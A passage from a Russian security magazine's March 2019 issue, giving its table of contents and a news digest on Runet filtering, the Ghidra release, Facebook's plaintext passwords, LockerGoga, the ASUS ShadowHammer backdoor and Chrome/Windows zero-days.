
                                                  Март 2019
            № 240
CONTENTS

    MEGANews
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

    RSA Conference 2019
  7 лучших докладов с топовой ИБ‐кон ферен ции

     Ghidra vs IDA Pro
  На что способен бесплат ный тулкит для ревер са, созданный в АНБ

     Ghidra vs crackme
  Обкатыва ем кон курен та IDA Pro на примере решения хитрой крэкми с VM

    Мастхэв для мобильной ана литики
  Что нуж но, что бы вскрывать приложения для Android на Android

    Трояны на продажу
  Изучаем под польный рынок вредонос ного ПО

     Troldesh
  Как на самом деле работа ет нашумевший тро ян‐шифровальщик

    ODT под прицелом
  Как зас тавить докумен ты OpenOfﬁce запускать произвольные файлы

    Фун дамен тальные осно вы хакерства
  Новые спо собы находить защитные механизмы в чужих программах

    Файлы по рель сам
  Как читать любые файлы с сер вера через Ruby on Rails

    Под водные камни AppCache
  Как злодеи иден тифицируют ста тус кросс‐домен ных ресурсов

    Новые уязвимости в популяр ном роуте ре D‐Link
  Колон ка Дениса Мак рушина

    Вре донос ный код в овечьей шкуре
  Как работа ет ата ка на анклав SGX

   Форен зика в Linux
  Дам пим память, диски и сетевые кон некты для дальнейшего поиска улик

    В поисках случай ности
  Ищем энтропию на микросхеме, чтобы повысить стой кость шифров

   Магия C++
  Как выжить без динамической идентифика ции типов и не сойти с ума

    Кейлоггер по‐домаш нему
  Пишем на C# кейлоггер, который не палится антивирусами

     CryptoPro JCP на Linux
  Как легко и безболез ненно перейти на новый стан дарт шиф рования

    Погружение в NixOS
  Осваиваем фичи одно го из самых необычных дистрибутивов GNU/Linux

     Тит ры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





РОСКОМНАДЗОР,
БЛОКИРОВКИ И DPI
Про верка Рунета на «суверен ность»
Ссылаясь на собственные источники, газета «Ведомости» сообщила, что
Роскомнадзор выбрал наиболее эффективное решение для блокировки
Telegram и не только. Таковым была признана раз работка компании RDP.RU,
в лабораторных условиях про демонстри ровавшая стопроцентную эффектив‐
ность блокировки мессенджера. По данным издания, блокировать мессен‐
джер предполагается пос редс твом использования DPI‐системы (Deep Packet
Inspection, глубокая фильтрация трафика), соз данной RDP.RU.
  Напомню, что о первых испытаниях систем ана лиза и фильтрации тра‐
фика, проведенных ФСБ, Роскомнадзором и Минис терством цифрового раз‐
вития, еще в августе 2018 года рассказыва ло агентство Reuters. Тогда тес‐
тирование проводилось на сети Рос телекома в Реутове.
  Тем временем РБК, тоже ссылаясь на собственные источники в отрасли,
пишет, что Роскомнадзор уже направил трем операторам «большой чет‐
верки» (МТС, «МегаФо ну» и «ВымпелКому») предложение протес тировать
на их сетях в каком‐либо регионе обо рудование для глубокой фильтрации
трафика, разработан ное RDP.RU. Сообщается, что цель тес тирования — под‐
готовка  к реализации  так называемого  за конопроекта о  «суверенном
Рунете», который был внесен в Госдуму в декаб ре 2018 года и уже принят
в первом чтении в феврале 2019 года.
  Интересно, что, по данным РБК, в рамках этих испытаний планиру ется
не только проверить возможность DPI‐системы филь тровать контент из реес‐
тра  запрещенных  ресурсов  (в  первую  очередь  речь,  конечно,  идет
о Telegram). Также планируется проверить возможность приоритизации тра‐
фика и последующего снижения скорости дос тупа к отдельным сервисам. Да,
речь о принципе сетево го нейтра литета, согласно которому провайдеры
не отдают предпочте ния одному целево му предназначению перед другим
или одним классам приложений.
  Издание напоминает, что еще в 2018 году глава «Ростелекома» Михаил
Осеевский объяснял необ ходимость такой меры тем, что это позволило бы
переложить часть расходов за хранение контента в рамках «закона Яровой»
с российских операторов связи на зарубеж ные интернет‐компании, такие
как Google и Facebook. В случае их отка за операто ры смогли бы снижать ско‐
рость доступа для або нентов до сервисов этих компаний.



      «У ряда отрасле вых экспер тов сущес тву ют опа сения, что оборудо-
      вание, уста нов ленное для противодействия угрозам, в дальнейшем
     может быть использовано в целях приоритиза ции тра фика одних
      ресур сов и дис кримина ции дру гих, соз нательно или в результате сбо-
      ев в работе»

— под твердил журналистам глава Рос сийской ассоциации электронных ком‐
муникаций Сергей Плугота ренко.



      «С помощью DPI можно вполне успешно приоритизировать тра фик
      и снизить скорость дос тупа к YouTube или любому дру гому ресур су.
     В 2009–2010 годах, когда был рас цвет популяр ности тор рент‑тре-
      керов, многие опе раторы связи ста вили себе DPI как раз для того,
      чтобы  рас позна вать  P2P-тра фик  и  снижать  скорость  ска чива ния
      на тор рентах, так как каналы связи не выдер живали такой нагрузки.
      Так что опыт пес симизирова ния некоторых видов тра фика у опе рато-
      ров уже име ется»

— говорит гендиректор Diphost и соз датель сайта Эшер II Филипп Кулин.



      «Технологии  DPI  могут применяться для приоритиза ции  тра фика.
      Думаю, что принципу сетевой нейтральнос ти в Рунете оста лись счи-
      таные недели и его отме на может кос нуться не только Google и Face-
      book. Нич то не меша ет опе раторам связи ввес ти тариф „Социальные
      сети“ и „Веб‑поч та и виде оконтент“, по которым пла тить за нор маль-
     ную скорость дос тупа к соответс тву ющим ресур сам придется уже
      конеч ным  пользовате лям.  Если  воз ника ет  воз можность  залезть
      в чужой кар ман, то зачем огра ничивать себя исклю чительно кар-
     манами индус триальными? Пользовательские кар маны  пусть и не
      такие глу бокие, но дос таточ но многочис ленные»

— считает руководитель Qrator Labs Александр Лямин.


Тре бование к VPN-сервисам
В конце марта на официальном сайте Роскомнадзора появилось сообщение
о том, что тре бования подключиться к государс твенной информационной
системе (ФГИС) были направлены владельцам десяти VPN‐сервисов: Nord‐
VPN, Hide My Ass!, Hola VPN, OpenVPN, VyprVPN, ExpressVPN, TorGuard, IPVan‐
ish, Kaspersky Secure Connection и VPN Unlimited.
  В заявлении регулятора ска зано, что согласно федеральному закону «Об
информации...»  указанные  сервисы  обязаны  подключиться  к  ФГИС
в течение 30 рабочих дней с момента нап равления требований («для получе‐
ния доступа к актуальной версии единого реестра запрещенной информа‐
ции»).
  Напомню, что ФГИС содержит информацию о ресурсах, доступ к которым
должен быть заблокирован на территории РФ. В свою очередь, закон о жес‐
ткой регуляции анонимайзеров и VPN, которые могут быть использованы
для обхода блокировок, был внесен в Думу еще летом 2017 года и уже
в ноябре вступил в силу (276‐ФЗ).



      «В слу чае выяв ления фак та несоблюдения пре дус мотренных законом
      обязанностей Рос комнад зор может принять решение об огра ниче нии
      дос тупа к VPN-сер вису. В нас тоящее вре мя к ФГИС под клю чены опе-
      раторы  поис ковых  сис тем  Яндекс,  „Спутник“,   Mail.ru,  Rambler.
     В начале текуще го года ком пания Google была оштра фова на Рос-
      комнад зором на 500  тысяч рублей  за неис полне ние  тре бова ний
      о под клю чении к ФГИС, пос ле чего начала фильтра цию поис ковой
      выдачи  в  соответс твии  с  реес тром.  Тре бова ния  о  под клю чении
       к ФГИС в адрес VPN-сер висов и „анонимайзеров“ ранее не нап равля-
      лись»

— сообщает Роскомнадзор.
  По информации «Говорит Москва», требова ние регуля тора согласна
выпол нить «Лаборатория Кас перско го», тогда как представители NordVPN,
TorGuard и VyprVPN уже заявили, что не намерены этого делать. При этом
разработчики TorGuard и вовсе расска зали о том, что прекратят исполь‐
зование российских серверов и очистят их ради безопасности пользовате‐
лей.


3 000 000 ПОЛЬЗОВАТЕЛЕЙ TELEGRAM ЗА ДЕНЬ


В середине марта 2019 года во всем мире произошел сбой в работе WhatsApp, Facebook и In‐
stagram, длившийся около 14 часов. Как стало извес тно позже, глобальные неполадки были
спровоцированы некими «изменениями в конфигурации сервера», потянувшими за собой
целый каскад проблем.


На следующий день после сбоя из Facebook уволились сразу два топ‐менеджера — директор
по развитию продукта Крис Кокс и глава подразделения WhatsApp Крис Дэниэлс, и вряд ли
это было простым совпадением.


Тем временем Павел Дуров сообщил в своем Telegram‐канале, что все го за сутки «простоя»
WhatsApp, Facebook и Instagram к Telegram под ключилось 3 000 000 новых пользовате лей.
«Отлично. У нас здесь настоящая приватность и неог раниченное пространство для всех», —
пишет Дуров.





ИСХОДНИКИ GHIDRA
ОТКРЫТЫ
Представители  Агентства  национальной  безопасности США  объ явили
об открытии исходных кодов Ghidra — инстру мента для обратного инжи‐
ниринга, который сами спецслужбы применя ют уже порядка двад цати лет.
  Широкая общественность узнала о Ghidra в 2017 году благодаря докумен‐
там Vault7, опубликованным WikiLeaks. Впро чем, до этого факт существования
Ghidra тоже не был засекречен.
  В настоящее время Ghidra уже можно загрузить с официального сайта, и в
скором времени исходные коды также планируют разместить на GitHub.
Ghidra написана на Java и имеет GUI, работа ющий под Windows, Mac и Linux.
  Многие ИБ‐специалисты считают, что это рас крытие кодов может кар‐
динально изме нить давно сло жившуюся ситуацию. Дело в том, что бесплат‐
ная и опенсорсная Ghidra может стать серь езной альтернативой многим ана‐
логичным инструментам в целом и проприетарной и платной IDA Pro в час‐
тности  (инте рактивному  дизассемблеру,  который  широко  применяется
для реверса, но его лицензионная вер сия стоит нес колько тысяч дол ларов
в год).
  Нужно сказать, что релиз не обо шелся без накладок. Буквально через нес‐
колько часов после публикации в коде Ghidra обна ружили первый баг. Бри‐
танский ИБ‐эксперт и глава Hacker House Мэттью Хики (Matthew Hickey)
заметил, что в отладочном режиме инстру мент АНБ открывает и «слушает»
сетевой порт 18001, что позволяет подключить ся к Ghidra удаленно, через
JDWP (разумеется, с целью все той же отладки). Хики отме чал, что исправить
проблему совсем несложно.
  Постепенно всплывают и другие баги. Например, была най дена воз‐
можность эксплуатировать XXE при условии, что поль зователь Ghidra откроет
специально сформированный проект.
  Тем временем мы уже посвятили изучению Ghidra две статьи. В первом
материале срав ниваем Ghidra и IDA Pro, а во втором разбираем практический
кейс и ломаем несложную крэкми MalwareTech.




Брайан Эктон (Brian Acton), один из соосновате лей мес сенджера WhatsApp, теперь принад‐
лежащего компании Facebook, продолжает выс казываться о социальной сети в край не негатив‐
ном ключе.


Во время выступления в Стэнфордском университете Эктон отме тил, что круп ные технологи‐
ческие компании (такие как Apple и Google) и социальные медиа попросту не справляются
с модерацией контента, а пользовате ли лишь увеличивают их влияние. Дело в том, что Эктон
убежден: для Facebook на первом месте стоит вовсе не приватность пользователей, а монети‐
зация продуктов.





→«Эти ком пании не располагают необходимыми средствами для принятия таких решений.
А мы даем им власть. И это самое страшное. Мы покупаем их продукцию. Мы регис трируемся
на таких сайтах. Удалите Facebook, ладно?»
— Эктон во время выступления в Стэн фордском университете





FACEBOOK
И 600 МИЛЛИОНОВ
ПАРОЛЕЙ
Компания Facebook в очередной раз ока залась в центре скандала, связан‐
ного с приватностью пользовательских данных. На этот раз выяснилось, что
пароли 200–600 миллионов пользователей от Facebook Lite, Facebook и Insta‐
gram хранились на серверах компании в формате простого текста, доступные
тысячам сотрудников.
  Первым о данной проблеме расска зал известный ИБ‐журналист Брайан
Кребс (Brian Krebs). В своей статье Кребс ссылался на данные, полученные
от неназванного сотрудника Facebook, занимающе го в компании некий
руководящий пост.
  По информации Креб са, в настоящее время Facebook проводит внут‐
реннее расследование, которое уже выявило, что пароли сотен миллионов
пользователей  хранились  в  открытом  виде  и  были  свобод но  дос‐
тупны 20 000 сотрудников компании. Источник сообщил, что пока предста‐
вители социальной сети не сумели установить точное количество паролей,
а также определить, как давно те были дос тупны сотрудникам. Некоторые
данные оказались датиро ваны 2012 годом.
   Также, по словам источника, в логах уже были обнаружены свидетельства
того, что около 2000 инженеров и раз работчиков Facebook сде лали поряд‐
ка 9 000 000 внутренних запросов к элементам данных, содержавшим поль‐
зовательские пароли в открытом виде.
  После публикации Креб са предста вители Facebook были вынуждены опуб‐
ликовать официальное заявление о случившемся.
  В компании подтвердили, что проблему с паролями обнаружили еще в
январе текущего года и в настоящее время проводится рас следование. Пока
в Facebook не готовы назвать точные даты и цифры (впрочем, сообщается,
что речь идет о десятках миллионов пострадавших пользовате лей). Однако
представители социальной сети уверяют, что пароли пользователей не были
«видны» никому за пределами Facebook, а к нас тояще му моменту не выяв‐
лено ни одного случая зло употребления этими данными со стороны сот‐
рудников.
   Согласно заявлению социальной сети, пароли на серверах компании,
разумеется,  сохранялись «непредна меренно». В нас тоящее вре мя все
пароли уже были скрыты, а пос тра давших пользователей обязательно уве‐
домят о случившемся, как только рас следова ние инцидента будет закончено.


УЯЗВИМОСТИ? MICROSOFT!
Какие уязвимости и эксплоиты всегда вос тре бован ны среди злоумышленников и инте ресуют их
больше всего? Специалисты ком пании Recorded Future подсчитали, что в 2018 году 8 из 10
самых популярных среди преступников уязвимос тей были обнаруже ны в продук тах Microsoft.
   Статистика Recorded Future основывается на дан ных из тысяч различных источни ков. Спе‐
циалисты изучали репозитории с кодом, хакерские форумы и сайты в даркнете. Также они про‐
анализировали активность 167 наборов эксплоитов и 429 тро янов удален ного доступа.
   Уязвимости в решениях Microsoft «лидируют» уже второй год подряд, тогда как в 2015–
2016 годах преступников боль ше интересовали баги в Adobe Flash Player.
   В общей сложности количес тво эксплоит‐китов в 2018 году сократилось на 50%.
   Несмотря на общий тренд угасания эксплоит‐китов, в 2018 году на сце не появились сразу
5 новых наборов: Best Pack, Creep, Darknet Angler, Fallout и LCG Kit.





            О каких эксплоит‐китах и проблемах чаще всего говорят в даркне те

Все по‐прежнему активные наборы эксплоитов использовали хотя бы 1 из 3 наиболее
популярных уязвимостей года.
   Старейшая проблема в списке исследователей (касается Microsoft Ofﬁce) датирована
2012 годом, но продолжает использоваться до сих пор.
   Помимо продуктов Microsoft, в список попали уязвимос ти в Adobe Flash Player и Android.





                        Топ‐10 самых «популярных» уязвимостей 2018 года





GOOGLE СНОВА
ОШТРАФОВАЛИ
В третий раз за последние два года Еврокомис сия наложила на компанию
Google крупный штраф. На этот раз проб лемы у поис кового гиганта воз никли
из‐за злоупотребления доминирующим положением на рынке рекламы.
В частности, речь идет об AdSense for Search. То есть дело не в тех рек‐
ламных объявле ниях, что отоб ража ются в результатах поиска Google.com,
дело в кастомном поиске через Google, который может быть встроен на дру‐
гие сайты (как правило, для поиска по ним же).
  По данным регулятора, более десяти лет (с 2006 по 2016 год) Google
пользовалась тем, что занимает доминирующую позицию в сфере рекламы,
и мешала другим компаниям конкурировать и раз виваться. Google не только
навязывала компаниям свою рекламную платформу, но и не позволяла своим
конкурентам размещать рекламные объявления на  таких сайтах,  тогда
как реклама самой Google получа ла лучшие места («премиальное раз‐
мещение», или Premium Placement). Происходившее хорошо иллюстрирует
представ ленная регулятором картинка.





Хотя на этот раз Google сотрудничала с Еврокомиссией, а в работу AdSense
давно были вне сены изменения, из‐за допущенных нарушений компания все
равно должна будет выплатить штраф в раз мере 1,49 мил лиарда евро
(1,69 миллиарда дол ларов США).
   Как было упомянуто выше, это уже третий крупный штраф, полученный
Google от европейского регулятора. Так, в 2017 году компанию обязали вып‐
латить  2,4 миллиарда  евро  из‐за  манипуляций  результатами  поис ка,
а в 2018 году еще 4,34 миллиарда из‐за многочисленных антимонопольных
нарушений, связанных с мобильной ОС Android.
  Интересно, что именно теперь, ког да стало извес тно о новом решении
Еврокомиссии и новом штрафе, специалисты Google анонсировали, что
в ближайшее время европейские пользователи Android смогут самостоятель‐
но решать, каким поисковиком и браузером они хотят пользоваться по умол‐
чанию. В свою оче редь, для Google Play, Google Chrome и Google Search были
созданы отдельные лицензии, и производители смогут пред ложить покупа‐
телям альтернативу.


19 000 000 ДОЛЛАРОВ ЗАРАБОТАЛИ WHITE HAT
В 2018 ГОДУ

Администрация проекта HackerOne опубликовала официальную  статис тику за 2018  год.
Как оказалось, в прошлом году этичные хакеры зарабо тали на вознаграждени ях за уязвимос ти
19 000 000  долларов.  Для  сравнения:  за  весь  период  существования  HackerOne,
с 2012 по 2017 год, участники платформы получили пример но столько же.

Наиболее активными оказались исследователи из Индии, США, России, Пакис тана и Ве-
ликобритании. Пользователи из этих стран сос тавляют 51% активных участников программ
bug bounty.


Также администрация HackerOne рас сказала о двух людях, которые зарабо тали на багах более
1 000 000 долларов каждый. Первым таким рекордсменом стал Сантьяго Лопес aka try_to_hack
из Аргентины. Он был самоучкой, ког да зарегистрировался на HackerOne в 2015 году, в воз‐
расте шестнадцати лет. За прошедшие годы он нашел более 1600 уязвимостей, в том числе
в решениях Twitter и Verizon Media.


Второй миллионер HackerOne — Марк Личфилд aka mlitchﬁeld. Он уже помог исправить более
900 багов в продук тах таких компаний, как Dropbox, Yelp, Venmo, Starbucks, Shopify и Rockstar
Games.





                                     Продолжение статьи →
← Начало статьи





 LOCKERGOGA И ЕГО
 ЖЕРТВЫ
  Пострадавшие
  В марте 2019 года шифровальщик LockerGoga ата ковал одного из крупней‐
  ших производителей алюминия в мире — норвежскую компанию Norsk Hydro,
  а также жертвами малвари, похоже, стали две круп ные американские ком‐
   пании, производящие силиконы, смолы и дру гие химические вещества: Hex‐
   ion и Momentive.
    В результате инцидента в Norsk Hydro пос тра дало большинство ИТ‐систем
  компании, а рабочие процес сы во многих подразделениях США и Европы
  пришлось перевести в ручной режим или при остановить вовсе.
     Хотя представители Norsk Hydro описывали слу чившееся как настоящую
   катастрофу, в компании тем не менее приняли решение не платить злоумыш‐
  ленникам выкуп и восстановить инфраструктуру из резервных копий.
     Позже стало известно, что Norsk Hydro может быть не единственной жер‐
  твой LockerGoga за пос ледние недели. В распоряжении редакции издания
   Vice Motherboard оказалось внутреннее письмо, направленное сотрудникам
  Momentive главой компании Джеком Боссом (Jack Boss). В послании тот
  пишет о некоем «гло бальном ИТ‐отключении» и просит бросить на раз‐
  решение проблемы все силы. Также в письме говорится, что данные на всех
  зараженных машинах, скорее всего, утеряны без возвратно и компания уже
   заказала «сотни новых компь ютеров».
     Сравнив вымогательское сообщение,  оставленное шифровальщиком
   в системах Hexion и Momentive, с сооб щением из Norsk Hydro, журналис ты
  пришли к выводу, что компании, вероятнее всего, пострадали от одной и той
  же угрозы, то есть от LockerGoga.
     Представите ли Hexion, в свою очередь, уже обна родовали пресс‐релиз,
  сообщающий, что компания ста ла жер твой некоего ИБ‐инцидента и в нас‐
  тоящее время старается вернуться к нормальной работе. Каких‐либо под‐
  робностей о случив шемся в компании не рас крывают, и пред ставители Hex‐
   ion отказались от коммента риев.
    До недав него времени и атаки на алюминиево го гиганта Norsk Hydro
  единственной другой подтвержденной жер твой LockerGoga считалась фран‐
   цузская консалтинговая компания Altran, которую шифровальщик атаковал
   в конце января 2019 года.


  О LockerGoga
  Представители пострадавших компаний не вдавались в технические под‐
  робности случившегося, но в Сети уже появилось множество теорий, в том
  числе и от ИБ‐специалис тов.
    Одним из исследователей, опубликовавших свой анализ инцидента
   в Norsk Hydro, стал извес тный ИБ‐эксперт Кевин Бомонт (Kevin Beaumont).
  Бомонт полагался на анализ образцов малвари, загруженных на VirusTotal,
  и считает, что заражение LockerGoga стало «финаль ным штрихом» в хорошо
  подготовленной атаке. По мнению специалиста, злоумышленники проникли
   в сеть Norsk Hydro и развивали свою атаку, пока не добрались до сервера Ac‐
    tive Directory.
    Дело в том, что у LockerGoga отсутс тву ет такая же способность к самораз‐
  множению, которая отличала WannaCry, NotPetya и Bad Rabbit, а значит,
  инфраструктура компании могла пос тра дать в таком масштабе лишь в том
   случае, если атакующие использовали Active Directory, чтобы рас пространить
  вредоноса на все рабочие станции одновременно.
     Также иссле дователь отмечает,  что LockerGoga был соз дан,  чтобы
  работать очень быстро: малварь привлекает все мощности и возможности
  CPU, чтобы шифрование данных на средней системе занимало лишь нес‐
   колько  минут.  Кроме  того,  LockerGoga  отклю чал  все  сетевые  карты
  на зараженных машинах и менял пароль от локаль ного аккаунта администра‐
   тора, что существенно затрудня ло вос ста новление пострадавших систем.
  Фактически это вынудило специалис тов  уста навливать бэкапы вручную,
  на каждый отдельный компьютер.
     Теорию Бомонта в некото ром роде подтвержда ет пре дупреждение, опуб‐
  ликованное ранее NorCERT. Эксперты предостерегли компании об угрозе
  LockerGoga и возможных ата ках и тоже упомина ли вектор распространения
  через Active Directory.
     Другая теория, обнародованная ана литиками компании Cisco Talos, и вов‐
  се гласит, что LockerGoga — это не обычный шифровальщик, авторы которо‐
   го преследуют финансовую выгоду. По мнению специалистов, функци ональ‐
   ность LockerGoga скорее схожа не с классичес кими шиф ровальщиками, а с
  вайперами (wiper, от английского wipe — «стирать», «удалять»), то есть дес‐
   труктивной малварью, которая намеренно портит и уничтожает данные.
    По этой причине исследователи Cisco Talos полагают, что недавние атаки
  могли быть делом рук пра витель ственных хакеров. Впрочем, эта теория почти
  не подкреплена фактами, а на мысль о том, что шифровальщик мог быть лишь
  прикрытием для более сложной операции, экспертов навела недавняя атака
  на другую норвежскую компанию: в феврале 2019 года жертвой китайской
  APT10 стала компания Visma, один из круп ней ших в Европе поставщиков
  облачных технологий.




  В честь 30‐летия WWW сэр Тимоти Джон Бер нерс‐Ли, один из создателей Всемирной паутины,
   опубликовал открытое письмо, в котором признал, что у современного интернета множество
   проблем. Атаки «правительственных хакеров», всевозможные сорта мошенничества, сетевая
   травля, рекламные модели, поощряющие кликбейты и распространение фальшивых новос тей,
   а социальные медиа и вовсе превратились в площадки для политических свар.


   Тем не менее сэр Бернерс‐Ли убежден, что еще не все потеряно и строить «новый интернет»
   взамен испорченного пока рано.





  →«Учитывая, как сильно изменился веб за последние тридцать лет, предположить, что веб,
   каким мы знаем его сегодня, неспособен изменить ся к лучшему в сле дующие тридцать лет,
   было бы пораженчеством и ограничен ностью. Если мы прос то махнем рукой на попытки соз‐
   дания лучшего веба сейчас, это будет означать, что не веб нас подвел. Это мы тогда подведем
   веб»
  — «отец» WWW в своем открытом пись ме





 БЭКДОРЫ В ПО ASUS
  Эксперты «Лаборатории Кас перско го» обнаружили, что компания Asus стала
  жертвой вредоносной кампании ShadowHammer. Неиз вестные злоумыш‐
  ленники скомпрометирова ли произво дителя, сумели закрепиться в сети
  и принялись раздавать бэкдоры через предус тановленный на устройства
  Asus инструмент для автоматического обновления ASUS Live Update. Он
  используется для обновления BIOS, UEFI, драйверов и при ложе ний. Вре‐
  доносные версии были раз мещены на liveupdate01s.asus.com и liveup‐
  date01.asus.com. Вскоре выводы ана литиков «Лаборатории Касперского»
  подтвердили их кол леги из компании Symantec.
     Атака имела место между июнем и ноябрем 2018 года (то есть хакеры кон‐
  тролировали ASUS Live Update около полуго да) и суммарно могла затронуть
  более миллиона устрой ств по всему миру, хотя изначальной целью ата‐
  кующих был сравнительно небольшой пул пользователей.
     Злоумышленники «опоз навали» своих жертв по зашитому в скомпромети‐
  рованную утилиту списку MAC‐адресов. Изу чив около 200 вре доносных
  образцов, эксперты обнаружили более 600 таких хешей.
    Интересен и тот факт, что зараженные версии апдейтера были подписаны
   двумя действительными сертификатами ASUSTeK Computer Inc. Один из них
   истек в середине 2018 года, и тогда ата кующие переключились на второй,
  который до сих пор не был отоз ван.





  Однако сами представители Asus хранили молчание. Хуже того, выяснилось,
   что изначально производитель вообще отрицал, что его серверы были ском‐
  прометированы, пытался вынудить сотрудни ков «Лаборатории Кас перского»
  подписать соглашение о неразглашении, а потом практически перестал под‐
  держивать со специалистами контакт.
    Лишь после того, как о случившемся ста ло извес тно всему миру, предста‐
   вители Asus были вынуждены выпустить официаль ный пресс‐релиз, который
  получился несколь ко странным. Так, в компании сообщили о релизе ASUS
   Live Update версии 3.6.8, содержащей исправления (то есть закрывающей
   «дыру», через которую хакеры поставляли бэкдоры на машины пользовате‐
   лей). При этом не совсем ясно, уда ляет ли обновление все следы присутс‐
   твия зараженной версии из системы. Также неясно, достаточно ли установки
  версии 3.6.8 для всех пострадавших, или поль зователям, которые входили
   в список целей зло умышленников, уже пора бросать все дела и как минимум
  переустанав ливать ОС.
     Для предотвращения подобных инци дентов защитные механизмы утилиты
  были улучшены, а также появилось шифрование end‐to‐end. Кроме того,
   в Asus уверяют, что обновили и улучшили всю архитектуру, с помощью
  которой конечные поль зователи «общаются» с серверами компании.
     Также документ гласит, что произошедшая атака была не такой уж мас‐
  штабной: якобы зло умышленников интересовала очень небольшая и спе‐
  цифическая группа поль зователей и вредонос ный код проник на крайне
  малое количество устройств. Более того, про изво дитель утверждает, что пос‐
   традали только владельцы ноутбуков. Никаких конкретных цифр представите‐
  ли Asus не называют, хотя у компании, в отличие от иссле дователей, есть дос‐
   туп ко всем необ ходимым логам и о проб леме в компании узнали еще два
  месяца тому назад.
    В завершение стоит заметить, что «Лаборатория Касперского» вообще
  не упомянута в заявлении Asus. Вместо этого к документу приложена ссылка
  на отчет компании FireEye, в общих чертах рас сказывающий о деятельности
  APT‐группировок, никак не связанных с данным инцидентом.
     К сожалению, это не первый раз, когда компанию Asus уличают в примене‐
  нии слабых мер безопасности. Так, Федеральная торговая комиссия США
  ранее уже судилась с Asus, и в 2016 году стороны пришли к соглашению, сог‐
  ласно которому в бли жайшие двадцать лет безопасность компании будут
   регулярно проверять независимые аудиторы. Впро чем, тогда речь шла толь‐
   ко о подразделении, разрабатывающем домаш ние роутеры.


  РЕКЛАМНЫЕ ТРЕКЕРЫ ВСЮДУ

   Посетителям государственных сайтов в странах ЕС стоит знать и помнить о том, что эти ресур‐
   сы буквально нашпигованы всевозможными рекламными трекерами. Иссле дование компании
   Cookiebot выявило, что за пользователями 89% государствен ных сайтов сле дят как минимум
   112 компаний.

   Конечно, правительственные сайты не получают доходов от рекламы и, по идее, должны
   подавать пример другим компаниям и организациям, демонстрируя, как сле дует вес ти себя
   в онлайне и соблюдать GDPR. Увы, на практике все выг лядит совсем иначе.

   На 25 сайтах из 28 изученных были обнаруже ны различные рекламные тре керы.

   «Маячков» не нашли всего на 3 ресурсах, принадлежащих влас тям Германии, Испании и Да-
   нии.

  В 52% случаев исследователи нашли рекламные трекеры и на сайтах государствен ных систем
   здравоохранения. Хотя эти ресур сы работают с конфиден циальной и крайне «чувстви тельной»
   информацией посетителей, а эта категория персональных данных отдельно защищается GDPR.


   Хуже всего ситуация обстоит у ирландской службы здравоохранения: трекеры обнаружены
   на 73% ресурсов.

   Как минимум 112 сторонних компаний следят за пользователями госсайтов в ЕС, и данные
   передаются на 131 домен.





       Компании, отслеживающие пользователей на госсайтах и сайтах государственных систем здра‐
                                             воохранения


   Например, всего одну страницу, посвящен ную абортам на французском сайте, монито рит сра‐
   зу 21 сторонняя компания.

  3 из 5 наиболее распространенных «маячков» принадлежат ком пании Google. При этом нужно
   учесть, что исследова тели не принимали во внимание тре керы Google Analytics.





 БАГИ В CHROME
 И WINDOWS 7
 ПОД АТАКАМИ
  В начале марта 2019 года разработчики бра узера Chrome сообщили, что
   в версии 72.0.3626.121 (вышла 1 марта 2019 года) была устранена опасная
   уязвимость нулево го дня: CVE‐2019‐5786. Так как на момент выхода патча
  данную проблему уже эксплуатирова ли злоумышленники, пользовате лей Win‐
  dows, macOS и Linux призвали обно виться как можно быс трее.
    Специалисты описали проблему как баг в управлении памятью в ком‐
  поненте FileReader (API, присутству ющий практичес ки во всех современных
  браузерах и позволя ющий веб‐приложениям читать содержимое файлов,
  хранящихся локально, на устройстве пользователя).
     Уязвимость относится к типу use‐after‐free и поз воляет атакующему выпол‐
   нить произвольный код в контексте бра узера. В зависимости от привилегий
  злоумышленник может устанавливать приложения, подменять или удалять
  данные, создавать новые учетные записи.
     Позже эксперты опубликова ли еще одно сообщение, где пояс нили, что
  злоумышленники комбинировали  эту  уяз вимость с другой  уязвимостью
  нулевого дня в Windows 7, которую в ско ром времени должна исправить
   Microsoft.
     Так как ранее ИБ‐эксперты писали, что при помощи бага в Chrome неиз‐
  вестные атакующие могли осуществлять побег из песочницы, спе циалисты
  Google рассказали, что речь шла о локальном повыше нии привиле гий,
  которое  стало возможным  из‐за  0day‐бага  в драйвере ядра Windows
   win32k.sys (проблема сопряжена с разыменованием нулевого указателя).
     Хотя патчи для Windows на тот момент еще не были готовы, специалисты
  Google все же сочли нужным заявить об уяз вимос тях публично, так как проб‐
  лема серьезная и ее используют хакеры.
     Стоит сказать, что активная эксплуата ция бага была обнаруже на только
  на 32‐битных версиях Windows 7, но инженеры Google все равно советовали
  всем пользователям уязвимых версий ОС подумать о переходе на Windows
  10 (или дождаться выхода исправлений и уста новить их сразу же, как только
  они станут доступны).
    В настоящее время Microsoft уже выпустила патчи не только для Windows 7,
  но и для Windows Server 2008, которую, как ока залось, тоже затрагивала дан‐
  ная проблема. Баг получил идентифика тор CVE‐2019‐0808, и аналитики
  «Лаборатории Касперского» уточнили, что проб лему использовали хакерские
   группировки FruityArmor и SandCat.


  206 000 КИБЕРПРЕСТУПЛЕНИЙ ЗАРЕГИСТРИРОВАНО
 В РОССИИ

   Представители МВД РФ сообщили, что в 2018 году в Рос сии было зарегис три ровано более
  206 000 преступлений, связанных с компьютерной информацией. Согласно официальному
   пресс‐релизу, речь идет о «прес туплениях, совершенных с использованием или применением
   расчетных карт, компьютерной техники, программных средств, фиктивных электронных пла‐
   тежей, сети интернет и средств мобиль ной связи».


   Кроме того, правоохранители заявили, что в прошлом году полиции удалось выявить более
  24 000 человек, которые совершали преступления такого рода.

   Напомню, что ранее в этом году Генеральная про куратура сообщала, что количество кибер‐
   преступлений в России за последние шесть лет вырос ло почти в 16 раз — до 174 000, из них
   расследовано только около 43 000.





 НОВЫЕ ПРОБЛЕМЫ
 В LTE
  В мае 2019 года группа специалистов из Корей ского института передовых
   технологий (ведущего учебного и исследова тельского университета Южной
  Кореи) представит на мероприятии IEEE Symposium on Security and Privacy
  доклад, посвященный уяз вимос тям протокола LTE. Однако сам документ был
  обнародован уже сейчас.
    Обнаруженные проб лемы позволяют потенциальным злоумышленникам
  нарушать работу базовых станций, блокировать входящие вызовы на конкрет‐
  ное устройство, отключать пользователей от мобильной сети, отправлять
  поддельные SMS‐сооб щения, а также манипулировать трафиком пользовате‐
  лей и прослушивать его.
     Это далеко не первый случай, когда эксперты ука зывают на несовершенс‐
   тво LTE. К примеру, в марте 2018 года груп па специалис тов из Университета
  Пердью и Университета Айовы предста вила отчет о множественных уяз‐
